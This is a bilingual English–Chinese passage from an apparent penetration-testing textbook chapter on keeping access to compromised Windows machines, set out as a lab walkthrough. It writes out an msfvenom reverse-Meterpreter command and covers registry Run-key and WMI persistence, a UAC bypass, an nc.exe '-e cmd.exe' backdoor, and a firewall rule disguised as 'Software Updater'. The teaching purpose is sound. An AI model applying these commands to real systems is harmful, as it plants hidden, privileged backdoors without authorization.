- en: '*Chapter 17*: Maintaining Access'
  id: totrans-0
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: '*第17章*：保持访问'
- en: We’ve been on a long journey together through these chapters. It’s fitting that
    we end up here, asking the remaining question after you’ve forced your way in
    and proven there’s a gap in the client’s defense – *how do I keep my access?*
    This is a funny question because it’s often neglected, despite its importance.
    When a lot of people talk about hacking computers, they think about the excitement
    of working your way up to breaking open the door. Hacking is problem solving,
    and sometimes it’s easy to forget that being able to persist our access is a problem
    in its own right. In the context of penetration testing in particular, persistence
    can be easily taken for granted because we’re often working on tight schedules.
    Sometimes, it seems like there’s a race to get domain admin or root, and then
    we just stop there to wrap up the report. It’s a shame that assessments are often
    scheduled this way, especially in today’s world of **advanced persistent threats**
    (**APTs**).
  id: totrans-1
  prefs: []
  type: TYPE_NORMAL
  zh: 我们已经在这些章节中一起走过了很长的路。现在我们来到这里，提出剩下的问题：在你强行进入并证明客户的防御存在漏洞之后——*如何保持我的访问权限？* 这是一个有趣的问题，因为它常常被忽视，尽管它非常重要。当很多人谈论黑客攻击时，他们想到的是如何突破防线的兴奋感。黑客攻击是解决问题的过程，有时我们容易忘记，保持访问权限本身也是一个问题。特别是在渗透测试的背景下，由于我们通常有紧迫的时间表，持久化往往会被视为理所当然。有时，看似有一个竞赛要赶紧获得域管理员或root权限，然后就停下来撰写报告。遗憾的是，评估往往就是这样安排的，尤其是在当今这个**高级持续性威胁**（**APT**）的时代。
- en: 'Remember a broad goal in your assessments: escalate from quiet to relatively
    noisy and note the point at which you’re caught. Getting domain admin while no
    one notices versus getting domain admin right as the authorities break down your
    door are two different results. This mentality should continue into the persistence
    phase.'
  id: totrans-2
  prefs: []
  type: TYPE_NORMAL
  zh: 记住你在评估中的一个广泛目标：从低调到相对显眼地升级，并注意你被捕获的时机。获得域管理员权限时没人注意到，和当当局破门而入时获得域管理员权限，结果是完全不同的。这种心态应延续到持久化阶段。
- en: 'In this chapter, we will cover the following:'
  id: totrans-3
  prefs: []
  type: TYPE_NORMAL
  zh: 本章我们将涵盖以下内容：
- en: Persistence with Metasploit and PowerShell Empire
  id: totrans-4
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用Metasploit和PowerShell Empire实现持久化
- en: Quick-and-dirty persistent netcat tunnels
  id: totrans-5
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 快速简陋的持久化netcat隧道
- en: Persistent access with PowerSploit
  id: totrans-6
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用PowerSploit实现持久化访问
- en: Technical requirements
  id: totrans-7
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 技术要求
- en: 'The following are the prerequisites for this chapter:'
  id: totrans-8
  prefs: []
  type: TYPE_NORMAL
  zh: 本章的前提条件如下：
- en: Kali Linux
  id: totrans-9
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Kali Linux
- en: A Windows 10 or 7 VM
  id: totrans-10
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 一个Windows 10或7虚拟机
- en: Persistence with Metasploit and PowerShell Empire
  id: totrans-11
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 使用Metasploit和PowerShell Empire实现持久化
- en: We’ve covered generating payloads at several points throughout this book. We
    played around with just plain **msfvenom** to generate payloads in a variety of
    formats and with custom options, and we explored stealthy patching legitimate
    executables with Shellter for advanced compromise. Now, we bring the discussion
    full circle by leveraging Metasploit’s persistence module.
  id: totrans-12
  prefs: []
  type: TYPE_NORMAL
  zh: 我们在本书的多个章节中讨论了生成有效载荷。我们用**msfvenom**生成了不同格式和自定义选项的有效载荷，也探讨了如何使用Shellter对合法可执行文件进行隐蔽修补，进行高级攻击。现在，我们通过利用Metasploit的持久化模块，来完成这个讨论。
- en: Creating a payload for the Metasploit persister
  id: totrans-13
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 为Metasploit持久化模块创建有效载荷
- en: For the sake of this demonstration, we’re going to generate a quick-and-dirty
    reverse Meterpreter executable. However, note that when we configure the persistence
    module, we can use any executable we want.
  id: totrans-14
  prefs: []
  type: TYPE_NORMAL
  zh: 为了演示，我们将生成一个快速简陋的反向Meterpreter可执行文件。然而，请注意，当我们配置持久化模块时，可以使用任何我们想要的可执行文件。
- en: 'We’ll keep it nice and simple with the following command:'
  id: totrans-15
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将通过以下命令保持简单明了：
- en: msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.154.133 LPORT=10000
    -f exe > persist.exe
  id: totrans-16
  prefs: []
  type: TYPE_NORMAL
  zh: msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.154.133 LPORT=10000
    -f exe > persist.exe
- en: 'Substitute your own IP and local port, of course:'
  id: totrans-17
  prefs: []
  type: TYPE_NORMAL
  zh: 当然，请替换为你自己的IP地址和本地端口：
- en: '![Figure 17.1 – Generating the payload with msfvenom ](image/Figure_17.01_B17616.jpg)'
  id: totrans-18
  prefs: []
  type: TYPE_IMG
  zh: '![图17.1 – 使用msfvenom生成有效载荷](image/Figure_17.01_B17616.jpg)'
- en: Figure 17.1 – Generating the payload with msfvenom
  id: totrans-19
  prefs: []
  type: TYPE_NORMAL
  zh: 图17.1 – 使用msfvenom生成有效载荷
- en: A word to the wise – this isn’t your ordinary payload that you’d use for an
    immediate means to an end. This isn’t a payload that, once it does its job, you
    discard and never think about again. This malicious program will persist and give
    the target more time to discover it. Careful research and planning will be your
    friend on this one.
  id: totrans-20
  prefs: []
  type: TYPE_NORMAL
  zh: 有一点要提醒大家——这不是你通常用来立即达成目标的有效载荷。这不是一个一旦完成任务就丢弃的有效载荷。这个恶意程序将**持久存在**，并让目标有更多时间发现它。细致的研究和规划将是你在这方面的好帮手。
- en: Configuring the Metasploit persistence module and firing away
  id: totrans-21
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 配置 Metasploit 持久化模块并发射
- en: The old version of **persistence_exe** had a bunch of flags for it, and you
    can still run it that way; however, that usage is deprecated at the time of writing,
    so I chose to use it as a **post** module. I like it now because it makes the
    whole process very simple. You define what the executable will be called when
    it resides on the target with **set REXENAME**, you point out where the executable
    is on your system with **set REXEPATH**, and you set the Meterpreter session where
    this attack will take place with **set SESSION**.
  id: totrans-22
  prefs: []
  type: TYPE_NORMAL
  zh: 旧版本的 **persistence_exe** 有许多标志，你仍然可以那样使用它；然而，在写作时，这种用法已经被弃用，所以我选择将其作为 **post**
    模块使用。我现在喜欢这种方式，因为它简化了整个过程。你只需通过 **set REXENAME** 定义可执行文件在目标上调用的名称，使用 **set REXEPATH**
    指定可执行文件在你的系统上的位置，并通过 **set SESSION** 设置此攻击将在哪个 Meterpreter 会话中进行。
- en: 'When you fire off **run**, the console will tell you exactly what it’s doing:'
  id: totrans-23
  prefs: []
  type: TYPE_NORMAL
  zh: 当你执行 **run** 时，控制台会准确告诉你它正在做什么：
- en: '![Figure 17.2 – Running the persistence module in Metasploit ](image/Figure_17.02_B17616.jpg)'
  id: totrans-24
  prefs: []
  type: TYPE_IMG
  zh: '![图 17.2 – 在 Metasploit 中运行持久化模块](image/Figure_17.02_B17616.jpg)'
- en: Figure 17.2 – Running the persistence module in Metasploit
  id: totrans-25
  prefs: []
  type: TYPE_NORMAL
  zh: 图 17.2 – 在 Metasploit 中运行持久化模块
- en: 'Let’s have a rundown of these steps:'
  id: totrans-26
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们快速回顾一下这些步骤：
- en: Metasploit reads your payload and writes it to the target.
  id: totrans-27
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: Metasploit 读取你的负载并将其写入目标。
- en: Metasploit executes the payload and returns the process ID for immediate use.
  id: totrans-28
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: Metasploit 执行负载并返回进程 ID 以供即时使用。
- en: Metasploit modifies the registry on the target to cause execution with every
    logon. (**HKCU** means **HKEY_CURRENT_USER**.)
  id: totrans-29
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: Metasploit 修改目标的注册表，使得每次登录时都会执行。（**HKCU** 表示 **HKEY_CURRENT_USER**。）
- en: The resource file that was created to accomplish these tasks is cleaned up.
  id: totrans-30
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 为了完成这些任务而创建的资源文件已经被清理。
- en: Now, we just sit and wait for our remote agent to check in. Let’s get our handler
    ready.
  id: totrans-31
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，我们只需坐着等待我们的远程代理进行签到。让我们准备好处理程序。
- en: Verifying your persistent Meterpreter backdoor
  id: totrans-32
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 验证你的持久化 Meterpreter 后门
- en: 'Though we can certainly verify that the registry change took place and that
    the payload is running in the current session, the real test is to deliberately
    break our connection with a reboot and wait for the phone home to our listener.
    Make sure you configure it with the correct port number. When you’re ready, go
    ahead and reboot your target:'
  id: totrans-33
  prefs: []
  type: TYPE_NORMAL
  zh: 尽管我们当然可以验证注册表更改是否发生，并且负载是否在当前会话中运行，但真正的测试是故意通过重启断开连接，并等待目标主机向我们的监听器发送信息。确保你配置了正确的端口号。当你准备好时，继续重启你的目标：
- en: '![Figure 17.3 – A new session from our persistent payload checking in ](image/Figure_17.03_B17616.jpg)'
  id: totrans-34
  prefs: []
  type: TYPE_IMG
  zh: '![图 17.3 – 我们的持久化负载发送新会话](image/Figure_17.03_B17616.jpg)'
- en: Figure 17.3 – A new session from our persistent payload checking in
  id: totrans-35
  prefs: []
  type: TYPE_NORMAL
  zh: 图 17.3 – 我们的持久化负载发送新会话
- en: Before long, I see the connection appear automatically upon logging in as the
    affected user account on the target.
  id: totrans-36
  prefs: []
  type: TYPE_NORMAL
  zh: 不久后，我看到在目标机器上以受影响用户账户登录时，连接会自动出现。
- en: Remember, the configuration of the persistent payload and listening attacker
    is crucial here. For example, if the attacker has an IP address assigned by DHCP,
    it’s liable to change and your payload can’t contact you anymore. Consider static
    IP addresses that you can keep for as long as you require persistence, and consider
    port numbers that aren’t likely to conflict with anything else you need while
    you wait for connections.
  id: totrans-37
  prefs: []
  type: TYPE_NORMAL
  zh: 记住，持久化负载和监听攻击者的配置至关重要。例如，如果攻击者使用的是 DHCP 分配的 IP 地址，那么该地址可能会发生变化，导致负载无法再与你联系。考虑使用静态
    IP 地址，这样你可以根据需要保持持久性，并选择那些不太可能与其他连接冲突的端口号。
- en: Not to be outdone – persistence in PowerShell Empire
  id: totrans-38
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 不甘示弱——PowerShell Empire 中的持久化
- en: If you haven’t already figured this out, PowerShell Empire is a very powerful
    framework. Since stealth is more important for persistence, executing payloads
    with PowerShell makes our lives a little easier; as you can imagine, a persistent
    Empire agent is gold.
  id: totrans-39
  prefs: []
  type: TYPE_NORMAL
  zh: 如果你还没有发现，PowerShell Empire 是一个非常强大的框架。由于隐匿性对于持久性更为重要，使用 PowerShell 执行负载使我们的工作变得稍微轻松一些；正如你能想象的，持久化
    Empire 代理就像黄金一样宝贵。
- en: 'If you need to review getting your agent up and running, go back to [*Chapter
    9*](B17616_09_Final_VK_ePub.xhtml#_idTextAnchor165), *PowerShell Fundamentals*.
    In our example, we’ve already set up our listener, executed a stager on the target,
    and established an agent connection with **SKD217BV**:'
  id: totrans-40
  prefs: []
  type: TYPE_NORMAL
  zh: 如果你需要回顾如何让代理启动并运行，请返回到[*第9章*](B17616_09_Final_VK_ePub.xhtml#_idTextAnchor165)，*PowerShell基础知识*。在我们的示例中，我们已经设置好了监听器，执行了目标上的一个起始程序，并与**SKD217BV**建立了代理连接：
- en: '![Figure 17.4 – A new agent in PowerShell Empire ](image/Figure_17.04_B17616.jpg)'
  id: totrans-41
  prefs: []
  type: TYPE_IMG
  zh: '![图 17.4 – PowerShell Empire中的新代理](image/Figure_17.04_B17616.jpg)'
- en: Figure 17.4 – A new agent in PowerShell Empire
  id: totrans-42
  prefs: []
  type: TYPE_NORMAL
  zh: 图 17.4 – PowerShell Empire中的新代理
- en: Try to fire off some modules with it. You might get an error message telling
    you that the agent needs to be in an elevated context. Well, that’s strange –
    you’re already the administrator. The likely scenario on our Windows 10 box is
    that **User Account Control** (**UAC**) is enabled.
  id: totrans-43
  prefs: []
  type: TYPE_NORMAL
  zh: 尝试用它启动一些模块。你可能会看到一个错误信息，提示你代理需要处于提升的上下文中。奇怪——你已经是管理员了。我们在Windows 10系统上可能出现的情况是**用户帐户控制**（**UAC**）已启用。
- en: Elevating the security context of our Empire agent
  id: totrans-44
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 提升我们的Empire代理的安全上下文
- en: UAC is a lovely feature Windows users have been dealing with since Vista – it
    prompts you to acknowledge certain changes to the system. The logic and effectiveness
    is a whole debate for another place, but it’s a step in the right direction from
    how things used to work in Windows – when an administrator was logged on, everything
    that account did had administrator privileges. UAC means that everything runs
    at a standard user level by default, including our naughty scripts. Thankfully,
    Empire doesn’t sweat this problem.
  id: totrans-45
  prefs: []
  type: TYPE_NORMAL
  zh: UAC是Windows用户自Vista以来一直在处理的一个可爱的功能——它提示你确认系统中的某些更改。这种逻辑和有效性是另一个话题的讨论内容，但它相较于Windows的早期版本，确实是朝着正确的方向迈出了步伐——当管理员登录时，该账户所做的所有事情都有管理员权限。UAC意味着默认情况下所有内容都以标准用户级别运行，包括我们的恶意脚本。幸运的是，Empire并不为此烦恼。
- en: 'Prepare the **bypassuac** module with **usemodule powershell/privesc/bypassuac**.
    If you use **info** to see your options, you’ll notice that the only important
    settings are **Agent** and **Listener**. Use the **set Listener** and **set Agent**
    commands and then the **execute** command:'
  id: totrans-46
  prefs: []
  type: TYPE_NORMAL
  zh: 准备**bypassuac**模块，使用**usemodule powershell/privesc/bypassuac**。如果你使用**info**查看选项，你会注意到，唯一重要的设置是**Agent**和**Listener**。使用**set
    Listener**和**set Agent**命令，然后执行**execute**命令：
- en: '![Figure 17.5 – Our new, privileged agent reporting in ](image/Figure_17.05_B17616.jpg)'
  id: totrans-47
  prefs: []
  type: TYPE_IMG
  zh: '![图 17.5 – 我们的新特权代理汇报情况](image/Figure_17.05_B17616.jpg)'
- en: Figure 17.5 – Our new, privileged agent reporting in
  id: totrans-48
  prefs: []
  type: TYPE_NORMAL
  zh: 图 17.5 – 我们的新特权代理汇报情况
- en: Oh, look – you made a new friend! Say hello to the **TANUBD6P** agent. Note
    that the original agent was not itself elevated, and it’s still running. Instead,
    a new agent with the elevated rights connects back to us.
  id: totrans-49
  prefs: []
  type: TYPE_NORMAL
  zh: 哦，看看——你交了一个新朋友！向**TANUBD6P**代理打个招呼吧。请注意，原始代理本身并没有被提升，它仍在运行中。相反，一个具有提升权限的新代理连接回我们。
- en: Creating a WMI subscription for stealthy persistence of your agent
  id: totrans-50
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 为了隐秘地保持代理的持久性，创建一个WMI订阅
- en: 'In short, the **Windows Management Instrumentation** (**WMI**) event subscription
    method will create an *event* with certain criteria that will result in persistent
    and fileless execution of our payload. There are different methods for this particular
    attack, but today we’re using the logon method. This will create a WMI event filter
    that will execute the payload after an uptime of 4 minutes. After entering the
    module mode with **use powershell/persistence/elevated/wmi**, set the agent that
    will receive the persistence task. Make sure you select the elevated one! It’s
    the agent with a star next to the username:'
  id: totrans-51
  prefs: []
  type: TYPE_NORMAL
  zh: 简而言之，**Windows管理工具**（**WMI**）事件订阅方法将创建一个*事件*，该事件具有某些标准，最终会实现我们的有效载荷的持久性和无文件执行。对于这种特定的攻击方法，有不同的方式，但今天我们使用的是登录方法。这将创建一个WMI事件过滤器，该过滤器将在系统运行4分钟后执行有效载荷。在进入模块模式后，使用**use
    powershell/persistence/elevated/wmi**，设置接收持久性任务的代理。确保选择提升权限的代理！它是用户名旁边有星号的代理：
- en: '![Figure 17.6 – Configuring our persistent agent ](image/Figure_17.06_B17616.jpg)'
  id: totrans-52
  prefs: []
  type: TYPE_IMG
  zh: '![图 17.6 – 配置我们的持久代理](image/Figure_17.06_B17616.jpg)'
- en: Figure 17.6 – Configuring our persistent agent
  id: totrans-53
  prefs: []
  type: TYPE_NORMAL
  zh: 图 17.6 – 配置我们的持久代理
- en: Note that we’re configuring both **set Agent** and **set Listener**. Now, let’s
    verify that the persistent agent is ready to dial in.
  id: totrans-54
  prefs: []
  type: TYPE_NORMAL
  zh: 请注意，我们正在配置**set Agent**和**set Listener**。现在，让我们验证持久代理是否准备好连接。
- en: Verifying agent persistence
  id: totrans-55
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 验证代理的持久性
- en: That’s it. However, the agent isn’t letting us know how things went. How do
    we know it works? Reboot the target and go back to the main menu in Empire. Your
    listener is still faithfully waiting for new agents to check in.
  id: totrans-56
  prefs: []
  type: TYPE_NORMAL
  zh: 就是这样。然而，代理没有告诉我们执行情况如何。我们怎么知道它是否有效？重启目标计算机，并返回 Empire 的主菜单。你的监听器仍然在忠实地等待新代理的连接。
- en: 'Check out the timestamps in this lab demonstration. The first two agents that
    we needed for escalation are now dead and were last seen at 12:00\. The only thing
    we need to remember about the WMI method is that the script won’t run for about
    5 minutes after the machine boots up:'
  id: totrans-57
  prefs: []
  type: TYPE_NORMAL
  zh: 请查看此实验演示中的时间戳。我们用于升级的前两个代理现在已经失效，最后一次出现在 12:00。关于 WMI 方法，我们需要记住的一点是，脚本在机器启动后的大约
    5 分钟内不会运行：
- en: '![Figure 17.7 – The persistent (and elevated!) agent reporting in ](image/Figure_17.07_B17616.jpg)'
  id: totrans-58
  prefs: []
  type: TYPE_IMG
  zh: '![图 17.7 – 持久（且提升权限的！）代理报告](image/Figure_17.07_B17616.jpg)'
- en: Figure 17.7 – The persistent (and elevated!) agent reporting in
  id: totrans-59
  prefs: []
  type: TYPE_NORMAL
  zh: 图 17.7 – 持久（且提升权限的！）代理报告
- en: Whoa! Our new agent is running as **SYSTEM**. We now have total control of the
    computer, and it will maintain this relationship through reboots. Permanent WMI
    subscriptions run as **SYSTEM**, rendering this not only a valuable persistence
    exercise but also a solid way to elevate privileges.
  id: totrans-60
  prefs: []
  type: TYPE_NORMAL
  zh: 哇！我们的新代理正在以**SYSTEM**身份运行。我们现在完全控制了计算机，并且它将在重启后保持这种关系。永久的 WMI 订阅以**SYSTEM**身份运行，这不仅使其成为一个有价值的持久化练习，而且也是提升权限的可靠方式。
- en: Hack tunnels – netcat backdoors on the fly
  id: totrans-61
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 黑客隧道 – 即时生成的 netcat 后门
- en: I can hear what you’re thinking. You’re wondering whether netcat is really a
    good idea for this purpose. It isn’t an encrypted tunnel with any authentication
    mechanism, and **nc.exe** is notoriously flagged by AV software. Well, we’re running
    with netcat for now because it makes for a nice demonstration, but there is a
    practical purpose – I’m not sure there’s anything quite as fast as this method
    for creating a persistent backdoor into a shell session on a Windows target. Nevertheless,
    you can leverage this method with any listener you like. Let’s look closer at
    our handcrafted payload.
  id: totrans-62
  prefs: []
  type: TYPE_NORMAL
  zh: 我知道你在想什么。你在想 netcat 是否真的是一个好的选择。它不是一个加密隧道，也没有任何认证机制，而且**nc.exe**常常被杀毒软件标记。不过，目前我们还是选择了
    netcat，因为它是一个不错的演示工具，但实际上也有实际用途——我不确定是否有比这种方法更快的方式来在 Windows 目标系统中创建一个持久的后门。不过，你可以使用任何你喜欢的监听器来利用这种方法。让我们更仔细地看看我们手工制作的有效负载。
- en: Uploading and configuring persistent netcat with Meterpreter
  id: totrans-63
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 使用 Meterpreter 上传并配置持久化 netcat
- en: We’ve seen the easy way to transfer files over the LAN with **SimpleHTTPServer**.
    This time, we’re assuming a Meterpreter foothold has been established and we’re
    just setting up a quicker *callback number*.
  id: totrans-64
  prefs: []
  type: TYPE_NORMAL
  zh: 我们已经看过使用**SimpleHTTPServer**在局域网上轻松传输文件的方法。这次，我们假设已经建立了 Meterpreter 的立足点，并且我们正在设置一个更快的*回调号码*。
- en: 'Use the **upload** command to get your backdoor onto the target. Next is the
    part that makes this happen with every boot – adding the executable to the registry.
    Note the double backslashes to escape the break that the single backslash normally
    represents:'
  id: totrans-65
  prefs: []
  type: TYPE_NORMAL
  zh: 使用**upload**命令将你的后门上传到目标。接下来的步骤是使其在每次启动时都能生效——将可执行文件添加到注册表中。请注意，双斜杠用于转义单个斜杠通常代表的换行符：
- en: upload /usr/share/windows-binaries/nc.exe C:\\Windows\\system32
  id: totrans-66
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 上传 /usr/share/windows-binaries/nc.exe C:\\Windows\\system32
- en: reg setval -k HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run -v nc
    -d 'C:\Windows\system32\nc.exe -Ldp 9009 -e cmd.exe'
  id: totrans-67
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: reg setval -k HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run -v nc
    -d 'C:\Windows\system32\nc.exe -Ldp 9009 -e cmd.exe'
- en: 'Meterpreter should report that the key was successfully set:'
  id: totrans-68
  prefs: []
  type: TYPE_NORMAL
  zh: Meterpreter 应该报告密钥已成功设置：
- en: '![Figure 17.8 – The Meterpreter upload and registry set for the persistent
    netcat ](image/Figure_17.08_B17616.jpg)'
  id: totrans-69
  prefs: []
  type: TYPE_IMG
  zh: '![图 17.8 – Meterpreter 上传和注册表设置用于持久化的 netcat](image/Figure_17.08_B17616.jpg)'
- en: Figure 17.8 – The Meterpreter upload and registry set for the persistent netcat
  id: totrans-70
  prefs: []
  type: TYPE_NORMAL
  zh: 图 17.8 – Meterpreter 上传和注册表设置用于持久化 netcat
- en: Note that the actual command for execution at boot time is **nc.exe -Ldp 9009
    -e cmd.exe**. Don’t forget that port number. There’s still a step left, though.
  id: totrans-71
  prefs: []
  type: TYPE_NORMAL
  zh: 请注意，启动时实际执行的命令是**nc.exe -Ldp 9009 -e cmd.exe**。不要忘记端口号。不过，仍然有一步需要完成。
- en: Remotely tweaking Windows Firewall to allow inbound netcat connections
  id: totrans-72
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 远程调整 Windows 防火墙以允许入站的 netcat 连接
- en: 'Now, I know what the hacker in you is saying, *all we did is ensure the backdoor
    will load at boot time. We’re probably gonna hit a firewall on the way back in*.
    Indeed, the student becomes the master. We can use a **netsh** one-liner to take
    care of this. Jump into a shell with the target and send this command:'
  id: totrans-73
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，我知道你心中的黑客在想，*我们所做的不过是确保后门在启动时加载而已，可能我们回去时会撞上防火墙*。确实，学生成了大师。我们可以使用 **netsh**
    一行命令来处理这个问题。进入目标的 shell，发送以下命令：
- en: netsh advfirewall firewall add rule name="Software Updater" dir=in action=allow
    protocol=TCP localport=9009
  id: totrans-74
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: netsh advfirewall firewall add rule name="Software Updater" dir=in action=allow
    protocol=TCP localport=9009
- en: 'Let’s look at what this looks like:'
  id: totrans-75
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们看看这个过程是怎样的：
- en: '![Figure 17.9 – Modifying the firewall from a shell on the target ](image/Figure_17.09_B17616.jpg)'
  id: totrans-76
  prefs: []
  type: TYPE_IMG
  zh: '![图 17.9 – 从目标的 shell 修改防火墙](image/Figure_17.09_B17616.jpg)'
- en: Figure 17.9 – Modifying the firewall from a shell on the target
  id: totrans-77
  prefs: []
  type: TYPE_NORMAL
  zh: 图 17.9 – 从目标的 shell 修改防火墙
- en: Note that I gave the rule a name. This involves a little social engineering
    on your part; you hope that an administrator glancing over the rules will tune
    out words such as *software* and *updater*. Of course, you could make the name
    *You got haxxed bro*. It’s up to you.
  id: totrans-78
  prefs: []
  type: TYPE_NORMAL
  zh: 注意，我给这个规则起了个名字。这需要一点社会工程学技巧；你希望管理员在查看规则时，忽略诸如 *software* 和 *updater* 这样的词。当然，你也可以将规则命名为
    *You got haxxed bro*。这由你决定。
- en: The **netsh** command lets you know that all is well with your rule addition
    with a simple **Ok**. Now, just as before, let’s confirm that the netcat backdoor
    will persist.
  id: totrans-79
  prefs: []
  type: TYPE_NORMAL
  zh: '**netsh** 命令会通过简单的 **Ok** 确认你添加的规则没问题。现在，像之前一样，我们来确认 netcat 后门是否会持久化。'
- en: Verifying persistence is established
  id: totrans-80
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 验证持久化是否建立
- en: 'Well, this is the easiest thing to verify. Try to contact your backdoor after
    rebooting the target:'
  id: totrans-81
  prefs: []
  type: TYPE_NORMAL
  zh: 这其实是最容易验证的事情。尝试在重启目标后联系你的后门：
- en: '![Figure 17.10 – Grabbing a shell from our backdoor after reboot ](image/Figure_17.10_B17616.jpg)'
  id: totrans-82
  prefs: []
  type: TYPE_IMG
  zh: '![图 17.10 – 重启后从我们的后门获取 shell](image/Figure_17.10_B17616.jpg)'
- en: Figure 17.10 – Grabbing a shell from our backdoor after reboot
  id: totrans-83
  prefs: []
  type: TYPE_NORMAL
  zh: 图 17.10 – 重启后从我们的后门获取 shell
- en: Once again, try this out with different listeners. Perhaps you could get away
    with SSH? Maybe you could get more granular with the firewall rule to only allow
    your IP address. Hopefully, the potential is clear to you now.
  id: totrans-84
  prefs: []
  type: TYPE_NORMAL
  zh: 再次尝试使用不同的监听器。也许你可以通过 SSH 连接？或许你可以通过防火墙规则更精细地设置，只允许你的 IP 地址。希望你现在已经看到了其中的潜力。
- en: No discussion about persistence on Windows targets is complete without a step
    into the world of PowerSploit. Let’s check it out.
  id: totrans-85
  prefs: []
  type: TYPE_NORMAL
  zh: 讨论 Windows 目标上的持久化时，没有涉及 PowerSploit 就不完整。让我们来看看它。
- en: Maintaining access with PowerSploit
  id: totrans-86
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 使用 PowerSploit 维持访问
- en: The PowerSploit framework is a real treat for the post-exploitation phase. The
    framework consists of a goodie bag full of PowerShell scripts that do various
    bits of magic. A full exploration of PowerSploit is an exercise I leave to you,
    dear reader. For now, we’re checking out the persistence module.
  id: totrans-87
  prefs: []
  type: TYPE_NORMAL
  zh: PowerSploit 框架是后期利用阶段的一个真正的宝藏。该框架包含了一系列 PowerShell 脚本，它们执行各种神奇的操作。PowerSploit
    的完整探索留给你，亲爱的读者。现在，我们正在查看持久化模块。
- en: Let’s understand the module concept first. Modules are essentially collections
    of PowerShell scripts that together form a cohesive theme or type of task. You
    can group tools together in a folder, dump that into the module path, and then
    import the group as needed. A well-written module integrates seamlessly with all
    of what makes PowerShell special. In particular, **Get-Help** works as expected
    with the scripts. Yes, you can run **Get-Help** on these malicious scripts to
    understand exactly how to use them. Let’s try it out.
  id: totrans-88
  prefs: []
  type: TYPE_NORMAL
  zh: 首先，我们来了解一下模块的概念。模块本质上是 PowerShell 脚本的集合，这些脚本共同组成一个统一的主题或任务类型。你可以将工具聚集在一个文件夹中，然后将其放入模块路径中，按需导入这个组合。一个写得很好的模块能够与
    PowerShell 的所有特点无缝集成。特别是，**Get-Help** 在这些脚本中也能正常工作。是的，你可以运行 **Get-Help** 来了解如何使用这些恶意脚本。我们来试试。
- en: Installing the persistence module in PowerShell
  id: totrans-89
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 在 PowerShell 中安装持久化模块
- en: 'In older versions of Kali, we had to manually pull the latest and greatest
    PowerSploit. Today, it’s built in and updatable with **apt**, so you can immediately
    use **powersploit** and start **SimpleHTTPServer** so that we can deliver the
    goodies to our Windows 10 box, where we’ll be prepping the persistence script:'
  id: totrans-90
  prefs: []
  type: TYPE_NORMAL
  zh: 在 Kali 的早期版本中，我们需要手动拉取最新的 PowerSploit。今天，它已经内置并且可以通过 **apt** 更新，所以你可以立即使用 **powersploit**
    并启动 **SimpleHTTPServer**，这样我们就可以将工具传送到我们的 Windows 10 机器，在那里我们将准备持久化脚本：
- en: '![Figure 17.11 – Setting up an HTTP server inside PowerSploit’s folder ](image/Figure_17.11_B17616.jpg)'
  id: totrans-91
  prefs: []
  type: TYPE_IMG
  zh: '![图 17.11 – 在 PowerSploit 文件夹内设置 HTTP 服务器](image/Figure_17.11_B17616.jpg)'
- en: Figure 17.11 – Setting up an HTTP server inside PowerSploit’s folder
  id: totrans-92
  prefs: []
  type: TYPE_NORMAL
  zh: 图 17.11 – 在 PowerSploit 文件夹内设置 HTTP 服务器
- en: 'With a browser running on the Windows 10 attacking box, download the entire
    **Persistence** folder. If you’re downloading the files individually, just make
    sure they end up in a local folder called **Persistence**:'
  id: totrans-93
  prefs: []
  type: TYPE_NORMAL
  zh: 在 Windows 10 攻击机上运行浏览器，下载整个**Persistence**文件夹。如果你是单独下载文件，只需确保它们最终被放入名为**Persistence**的本地文件夹中：
- en: '![Figure 17.12 – Grabbing the PowerSploit modules from the Kali attacker ](image/Figure_17.12_B17616.jpg)'
  id: totrans-94
  prefs: []
  type: TYPE_IMG
  zh: '![图 17.12 – 从 Kali 攻击者处获取 PowerSploit 模块](image/Figure_17.12_B17616.jpg)'
- en: Figure 17.12 – Grabbing the PowerSploit modules from the Kali attacker
  id: totrans-95
  prefs: []
  type: TYPE_NORMAL
  zh: 图 17.12 – 从 Kali 攻击者处获取 PowerSploit 模块
- en: 'Now, we need to install the persistence module in PowerShell. All we have to
    do is move the newly acquired **Persistence** folder over to the PowerShell module
    path on our system. Fire up PowerShell and display the **PSModulePath** environment
    variable with **$Env:PSModulePath**:'
  id: totrans-96
  prefs: []
  type: TYPE_NORMAL
